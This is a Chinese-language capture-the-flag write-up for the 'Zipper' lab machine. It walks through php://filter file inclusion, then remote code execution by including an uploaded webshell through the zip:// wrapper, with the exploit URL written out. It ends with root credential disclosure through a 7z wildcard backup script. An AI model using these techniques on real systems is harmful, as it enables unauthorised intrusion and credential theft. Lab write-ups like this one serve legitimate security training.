## 偵查

```shell
┌──(kali㉿kali)-[~/PG/Zipper]
└─$ cat scan_result.txt                                                    
# Nmap 7.95 scan initiated Wed Sep 10 01:49:01 2025 as: /usr/lib/nmap/nmap --privileged -vvv -p 22,80 -4 -sC -sV -o scan_result.txt 192.168.117.229
Nmap scan report for 192.168.117.229
Host is up, received reset ttl 61 (0.27s latency).
Scanned at 2025-09-10 01:49:01 EDT for 16s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDH6PH1/ST7TUJ4Mp/l4c7G+TM07YbX7YIsnHzq1TRpvtiBh8MQuFkL1SWW9+za+h6ZraqoZ0ewwkH+0la436t9Q+2H/Nh4CntJOrRbpLJKg4hChjgCHd5KiLCOKHhXPs/FA3mm0Zkzw1tVJLPR6RTbIkkbQiV2Zk3u8oamV5srWIJeYUY5O2XXmTnKENfrPXeHup1+3wBOkTO4Mu17wBSw6yvXyj+lleKjQ6Hnje7KozW5q4U6ijd3LmvHE34UHq/qUbCUbiwY06N2Mj0NQiZqWW8z48eTzGsuh6u1SfGIDnCCq3sWm37Y5LIUvqAFyIEJZVsC/UyrJDPBE+YIODNbN2QLD9JeBr8P4n1rkMaXbsHGywFtutdSrBZwYuRuB2W0GjIEWD/J7lxKIJ9UxRq0UxWWkZ8s3SNqUq2enfPwQt399nigtUerccskdyUD0oRKqVnhZCjEYfX3qOnlAqejr3Lpm8nA31pp6lrKNAmQEjdSO8Jxk04OR2JBxcfVNfs=
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI0EdIHR7NOReMM0G7C8zxbLgwB3ump+nb2D3Pe3tXqp/6jNJ/GbU2e4Ab44njMKHJbm/PzrtYzojMjGDuBlQCg=
|   256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDCc0saExmeDXtqm5FS+D5RnDke8aJEvFq3DJIr0KZML
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Zipper
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep 10 01:49:17 2025 -- 1 IP address (1 host up) scanned in 16.24 seconds
```

## 列舉

看看網頁有什麼東西  
只有一個合併檔案變成`zip`的功能。  
有注意到 `Logo` 跟 `Home` 是兩個鍵，照理來說只有一個就好了  
於是點擊看看，結果發現點擊 `Home` 的網址變成 `http://192.168.117.229/index.php?file=home`  
代表可能有其他的檔案可以訪問，嘗試看看 `index.php`，但是沒有效果，這時候可以看看有什麼 trick 可以用  
發現可以試試看 php filter，嘗試看看 `php://filter/convert.base64-encode/resource=index`，結果真的把 `index.php` leak 出來了  
程式碼如下
```php
<?php
$file = $_GET['file'];
if(isset($file))
{
    include("$file".".php");
}
else
{
include("home.php");
}
?>
```
接下來就是 `home.php` 的程式碼
```html
<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>Zipper</title>
  <meta name="viewport" content="width=device-width, initial-scale=1", shrink-to-fit=no"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-beta.2/css/bootstrap.min.css'>
<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css'><link rel="stylesheet" href="./style.css">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">

</head>
<body>
<?php include 'upload.php'; ?>
<!-- partial:index.partial.html -->
<nav class="navbar navbar-expand-md navbar-dark fixed-top bg-dark">
  <a class="navbar-brand" href="#">
    <i class="fa fa-codepen" aria-hidden="true"></i>
    Zipper
  </a>
  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarsExampleDefault" aria-controls="navbarsExampleDefault" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
  </button>

  <div class="collapse navbar-collapse" id="navbarsExampleDefault">
    <ul class="navbar-nav mr-auto">
      <li class="nav-item active">
        <a class="nav-link" href="/index.php?file=home">Home <span class="sr-only">(current)</span></a>
      </li>
    </ul>
    <form class="form-inline my-2 my-lg-0">
      <input class="form-control mr-sm-2" type="text" placeholder="Search" aria-label="Search">
      <button class="btn btn-outline-light my-2 my-sm-0" type="submit">Search</button>
    </form>
  </div>
</nav>

<!-- Main jumbotron for a primary marketing message or call to action -->
<div class="jumbotron">
  <div class="container">
    <h1 class="display-3">Welcome to Zipper!</h1>
    <p class="lead">
      With this online ZIP converter you can compress your files and create a ZIP archive. Reduce file size and save bandwidth with ZIP compression. 
      Your uploaded files are encrypted and no one can access them.
    </p>
    <hr class="my-4">
    <div class="page-container row-12">
    		<h4 class="col-12 text-center mb-5">Create Zip File of Multiple Uploaded Files </h4>
    		<div class="row-8 form-container">
            <?php 
            if(!empty($error)) { 
            ?>
    			<p class="error text-center"><?php echo $error; ?></p>
            <?php 
            }
            ?>
            <?php 
            if(!empty($success)) { 
            ?>
    			<p class="success text-center">
            Files uploaded successfully and compressed into a zip format
            </p>
            <p class="success text-center">
            <a href="uploads/<?php echo $success; ?>" target="__blank">Click here to download the zip file</a>
            </p>
	    	    <?php 
            }
            ?>
		    	<form action="" method="post" enctype="multipart/form-data">
				    <div class="input-group">
						<div class="input-group-prepend">
						    <input type="submit" class="btn btn-primary" value="Upload">
						</div>
						<div class="custom-file">
						    <input type="file" class="custom-file-input" name="img[]" multiple>
						    <label class="custom-file-label" >Choose File</label>
						</div>
					</div>
				</form>
				
    		</div>
		</div>
  </div>


</div>

<div class="container">
  <footer>
    <p>&copy; Zipper 2021</p>
  </footer>
</div> <!-- /.container -->
<!-- partial -->
  <script src='https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.13.0/umd/popper.min.js'></script>
<script src='https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-beta.2/js/bootstrap.bundle.min.js'></script>
</body>
</html>
```

在這份檔案中有看到`upload.php`，來看看。
```php
<?php
if ($_FILES && $_FILES['img']) {
    
    if (!empty($_FILES['img']['name'][0])) {
        
        $zip = new ZipArchive();
        $zip_name = getcwd() . "/uploads/upload_" . time() . ".zip";
        
        // Create a zip target
        if ($zip->open($zip_name, ZipArchive::CREATE) !== TRUE) {
            $error .= "Sorry ZIP creation is not working currently.<br/>";
        }
        
        $imageCount = count($_FILES['img']['name']);
        for($i=0;$i<$imageCount;$i++) {
        
            if ($_FILES['img']['tmp_name'][$i] == '') {
                continue;
            }
            $newname = date('YmdHis', time()) . mt_rand() . '.tmp';
            
            // Moving files to zip.
            $zip->addFromString($_FILES['img']['name'][$i], file_get_contents($_FILES['img']['tmp_name'][$i]));
            
            // moving files to the target folder.
            move_uploaded_file($_FILES['img']['tmp_name'][$i], './uploads/' . $newname);
        }
        $zip->close();
        
        // Create HTML Link option to download zip
        $success = basename($zip_name);
    } else {
        $error = '<strong>Error!! </strong> Please select a file.';
    }
}
```
現在知道我們的東西存在 `uploads` 資料夾中，並且可以上傳任何東西進去，我們可以嘗試上傳 webshell 看看。
`http://192.168.117.229/index.php?file=zip://uploads/upload_1757490908.zip%23cmd&cmd=id`
成功 GET www-data，接著就可以打 Rev Shell。
小總結一下：這邊先利用 php filter 讀取 `index.php`，接著發現 `home.php`，然後在 `home.php` 發現 `upload.php`，最後在 `upload.php` 發現可以上傳檔案到 `uploads` 資料夾中，並且可以利用 php filter 的 zip wrapper 來執行我們上傳的 webshell。

## 提權

- `sudo -l` 需要密碼
- `SUID` 沒找到東西
- 翻一翻 `/opt` & `/tmp` ，結果在 `/opt` 中翻到 `backup.sh`，內容如下
    ```bash
    #!/bin/bash
    password=`cat /root/secret`
    cd /var/www/html/uploads
    rm *.tmp
    7z /opt/backups/backup.zip -p $password -tzip *.zip > /opt/backups/backup.log
    ```

這個腳本給了我們線索。他是直接 `cat /root/secret` 來取得密碼的。所以可以找看看有沒有辦法監測他執行的時候輸出的內容。  
這時想到了`pspy`這個東西，來用用看。  
結果都沒有抓到，但是可看看到 `/opt/backups/backup.log` 這個檔案有東西，內容如下
```shell
cat backups/backup.log

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,1 CPU AMD EPYC 7371 16-Core Processor                 (800F12),ASM,AES-NI)

Open archive: /opt/backups/backup.zip
--
Path = /opt/backups/backup.zip
Type = zip
Physical Size = 3559

Scanning the drive:
9 files, 2187 bytes (3 KiB)

Updating archive: /opt/backups/backup.zip

Items to compress: 9


Files read from disk: 9
Archive size: 3559 bytes (4 KiB)

Scan WARNINGS for files and folders:

WildCardsGoingWild : No more files
```

得到了 `root:WildCardsGoingWild` 的 credential。